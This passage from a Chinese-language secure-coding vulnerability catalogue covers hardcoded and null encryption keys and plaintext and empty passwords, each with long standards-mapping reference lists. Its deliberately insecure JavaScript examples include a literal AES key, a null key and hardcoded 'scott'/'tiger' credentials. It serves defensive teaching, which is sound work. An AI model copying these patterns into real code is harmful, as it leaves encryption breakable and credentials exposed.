<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Key-Management-Hardcoded-Encryption-Key"><a href="#Key-Management-Hardcoded-Encryption-Key" class="headerlink" title="Key Management: Hardcoded Encryption Key"></a>Key Management: Hardcoded Encryption Key</h4><h5 id="ABSTRACT-62"><a href="#ABSTRACT-62" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>硬编码加密密钥可能会削弱安全性，一旦出现安全问题将无法轻易修正。</p>
<h5 id="EXPLANATION-62"><a href="#EXPLANATION-62" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用硬编码方式处理加密密钥绝非好方法，因为这样所有项目开发人员都能查看该加密密钥，而且还会使解决这一问题变得极其困难。在代码投入使用之后，必须对软件进行修补才能更改加密密钥。如果受加密密钥保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。</p>
<p>示例 1：以下代码使用了硬编码加密密钥：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var crypto = require(&apos;crypto&apos;);</span><br><span class="line"></span><br><span class="line">var encryptionKey = &quot;lakdsljkalkjlksdfkl&quot;;</span><br><span class="line"></span><br><span class="line">var algorithm = &apos;aes-256-ctr&apos;;</span><br><span class="line"></span><br><span class="line">var cipher = crypto.createCipher(algorithm, encryptionKey);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>任何可访问该代码的人都能访问加密密钥。在应用程序发布之后，除非对程序进行修补，否则将无法更改加密密钥。雇员可以利用手中掌握的信息访问权限入侵系统。如果攻击者可以访问应用程序的可执行文件，他们就可以提取加密密钥值。</p>
<h5 id="RECOMMENDATIONS-62"><a href="#RECOMMENDATIONS-62" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请勿对加密密钥进行硬编码，而应对加密密钥加以模糊化，并在外部资源文件中进行管理。如果在系统中采用明文的形式存储加密密钥，任何有足够权限的人即可读取加密密钥，还可能误用这些密码。</p>
<h5 id="REFERENCES-61"><a href="#REFERENCES-61" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 321 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-12 Cryptographic Key Establishment and Management (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.9.1 Cryptographic Software and Devices Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 6.4.1 Secret Management, 6.4.2 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
<p>[23] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 798 </p>
<p>[24] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 798 </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II </p>
<p>[42] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Key-Management-Null-Encryption-Key"><a href="#Key-Management-Null-Encryption-Key" class="headerlink" title="Key Management: Null Encryption Key"></a>Key Management: Null Encryption Key</h4><h5 id="ABSTRACT-63"><a href="#ABSTRACT-63" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>null 加密密钥可能会削弱安全性，一旦出现安全问题将无法轻易修正。</p>
<h5 id="EXPLANATION-63"><a href="#EXPLANATION-63" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>请勿使用 null 加密密钥，因为这样将会大幅减弱由优质加密算法提供的保护强度，并会大大增加解决问题的难度。一旦问题代码投入使用，要更改 null 加密密钥，就必须进行软件修补。如果受 null 加密密钥保护的帐户遭受入侵，系统所有者就必须在安全性和可用性之间做出选择。</p>
<p>示例 1：以下代码会使用 null 加密密钥执行 AES 加密：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">var crypto = require(&apos;crypto&apos;);</span><br><span class="line"></span><br><span class="line">var encryptionKey = null;</span><br><span class="line"></span><br><span class="line">var algorithm = &apos;aes-256-ctr&apos;;</span><br><span class="line"></span><br><span class="line">var cipher = crypto.createCipher(algorithm, encryptionKey);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>不仅任何可以访问此代码的人能够确定它使用的是null加密密钥，而且任何掌握最基本破解技术的人都更有可能成功解密任何加密数据。一旦应用程序发布，要更改null加密密钥，就必须进行软件修补。雇员可以利用手中掌握的信息访问权限入侵系统。即使攻击者只能访问应用程序的可执行文件，他们也可以提取使用了null加密密钥的证据。</p>
<h5 id="RECOMMENDATIONS-63"><a href="#RECOMMENDATIONS-63" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>加密密钥绝不能为 null，而应对其加以模糊化，并在外部源中进行管理。在系统中的任何位置采用明文的形式存储加密密钥（null 或非 null），会造成任何有足够权限的人均可读取和无意中误用此加密密钥。</p>
<h5 id="REFERENCES-62"><a href="#REFERENCES-62" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 321 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002450 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-12 Cryptographic Key Establishment and Management (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.9.1 Cryptographic Software and Devices Verifier Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.2.1 Algorithms, 6.4.1 Secret Management, 6.4.2 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M6 Broken Cryptography </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 7.2 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3350 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002010 CAT II </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002010 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002010 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002010 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002010 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002010 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002010 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002010 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002010 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002010 CAT II </p>
<p>[40] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13) </p>
<h4 id="Password-Management"><a href="#Password-Management" class="headerlink" title="Password Management"></a>Password Management</h4><h5 id="ABSTRACT-64"><a href="#ABSTRACT-64" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>采用明文的形式存储密码会危及系统安全。</p>
<h5 id="EXPLANATION-64"><a href="#EXPLANATION-64" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>当密码以明文形式存储在应用程序中时，会发生 password management 漏洞。</p>
<p>示例：以下代码使用 hardcoded password 来连接应用程序和检索地址簿条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">obj = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">obj.open(&apos;GET&apos;,&apos;/fetchusers.jsp?id=&apos;+form.id.value,&apos;true&apos;,&apos;scott&apos;,&apos;tiger&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>该代码会正常运行，但是任何能够访问其中所包含的网页的人都能得到这个密码。</p>
<h5 id="RECOMMENDATIONS-64"><a href="#RECOMMENDATIONS-64" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>绝不能采用明文的形式存储密码。应由管理员在系统启动时输入密码。如果这种方法不切实际，一个安全性较差、但通常都比较恰当的解决办法是将密码模糊化，并把这些去模糊化的资源分散到系统各处，因此，要破译密码，攻击者就必须取得并正确合并多个系统资源。</p>
<p>有些第三方产品宣称可以采用更加安全的方式管理密码。例如，WebSphere Application Server 4.x 用简单的异或加密算法加密数值，但是请不要对诸如此类的加密方式给予完全的信任。WebSphere 以及其他一些应用服务器通常都只提供过期的且相对较弱的加密机制，这对于安全性敏感的环境来说是远远不够的。安全的做法来是采用由用户创建的所有者机制，而这似乎也是目前唯一可行的方法。</p>
<h5 id="REFERENCES-63"><a href="#REFERENCES-63" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 256 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Access Violation </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.1.1 Password Security Requirements, 2.1.2 Password Security Requirements, 2.1.3 Password Security Requirements, 2.1.4 Password Security Requirements, 2.1.7 Password Security Requirements, 2.1.8 Password Security Requirements, 2.1.9 Password Security Requirements, 2.7.5 Out of Band Verifier Requirements, 2.10.3 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 2.1.1 Password Security Requirements, 2.1.2 Password Security Requirements, 2.1.3 Password Security Requirements, 2.1.4 Password Security Requirements, 2.1.7 Password Security Requirements, 2.1.8 Password Security Requirements, 2.1.9 Password Security Requirements, 2.3.1 Authenticator Lifecycle Requirements, 2.6.2 Look-up Secret Verifier Requirements, 2.6.3 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.3 Single or Multi Factor One Time Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.1 Service Authentication Requirements, 2.10.2 Service Authentication Requirements, 2.10.3 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.4.1 Secret Management, 6.2.1 Algorithms, 6.2.3 Algorithms, 6.2.4 Algorithms, 6.2.5 Algorithms, 6.2.6 Algorithms, 6.4.1 Secret Management, 8.2.2 Client-side Data Protection, 8.3.4 Sensitive Private Data, 9.1.2 Communications Security Requirements, 9.1.3 Communications Security Requirements, 9.2.3 Server Communications Security Requirements, 10.2.1 Malicious Code Search, 10.2.3 Malicious Code Search, 14.1.3 Build </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.3 - Authentication and Access Control, Control Objective 7 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311 </p>
<p>[23] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311 </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3210.1 CAT II, APP3340 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-001740 CAT I, APSC-DV-002330 CAT II </p>
<h4 id="Password-Management-Empty-Password"><a href="#Password-Management-Empty-Password" class="headerlink" title="Password Management: Empty Password"></a>Password Management: Empty Password</h4><h5 id="ABSTRACT-65"><a href="#ABSTRACT-65" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>Empty password 可能会危及系统安全，并且无法轻易修正出现的安全问题。</p>
<h5 id="EXPLANATION-65"><a href="#EXPLANATION-65" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用空密码绝非好方法。一旦代码投入使用，解决这一问题将变得极其困难。除非对软件进行修补，否则将无法更改密码。如果受空密码保护的帐户遭受入侵，系统所有者将必须在安全性和可用性之间做出选择。</p>
<p>示例：以下代码使用 empty password 来连接应用程序和检索地址簿条目：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">obj = new XMLHttpRequest();</span><br><span class="line"></span><br><span class="line">obj.open(&apos;GET&apos;,&apos;/fetchusers.jsp?id=&apos;+form.id.value,&apos;true&apos;,&apos;scott&apos;,&apos;&apos;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这些代码将成功运行，但任何人员在知道用户名后均可进行访问。</p>
<h5 id="RECOMMENDATIONS-65"><a href="#RECOMMENDATIONS-65" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>密码始终不能为空。一般来说，应对密码加以模糊化，并在外部资源中进行管理。如果将密码以明文形式存储在网站中任意位置，会造成任何有充分权限的人读取和无意中误用密码。对于需要输入密码的 JavaScript 引用，最好在连接时就提示用户输入密码。</p>
<h5 id="REFERENCES-64"><a href="#REFERENCES-64" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 259 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [13] CWE ID 287, [19] CWE ID 798 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-000196, CCI-001199, CCI-003109 </p>
<p>[4] Standards Mapping - FIPS200 IA </p>
<p>[5] Standards Mapping - General Data Protection Regulation Insufficient Data Protection </p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-28 Protection of Information at Rest (P1) </p>
<p>[7] Standards Mapping - OWASP Application Security Verification Standard 4.0 2.1.1 Password Security Requirements, 2.1.2 Password Security Requirements, 2.1.3 Password Security Requirements, 2.1.4 Password Security Requirements, 2.1.7 Password Security Requirements, 2.1.8 Password Security Requirements, 2.1.9 Password Security Requirements, 2.3.1 Authenticator Lifecycle Requirements, 2.6.2 Look-up Secret Verifier Requirements, 2.7.1 Out of Band Verifier Requirements, 2.7.2 Out of Band Verifier Requirements, 2.7.3 Out of Band Verifier Requirements, 2.8.4 Single or Multi Factor One Time Verifier Requirements, 2.8.5 Single or Multi Factor One Time Verifier Requirements, 2.10.1 Service Authentication Requirements, 2.10.2 Service Authentication Requirements, 2.10.4 Service Authentication Requirements, 3.5.2 Token-based Session Management, 3.7.1 Defenses Against Session Management Exploits, 6.4.1 Secret Management, 9.2.3 Server Communications Security Requirements, 10.2.3 Malicious Code Search </p>
<p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M2 Insecure Data Storage </p>
<p>[9] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage </p>
<p>[10] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A3 Sensitive Data Exposure </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.8, Requirement 8.4 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.4 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.3.1, Requirement 6.5.3, Requirement 8.2.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 5.3 - Authentication and Access Control, Control Objective 6.3 - Sensitive Data Protection, Control Objective 7 - Use of Cryptography </p>
<p>[22] Standards Mapping - SANS Top 25 2009 Porous Defenses - CWE ID 259 </p>
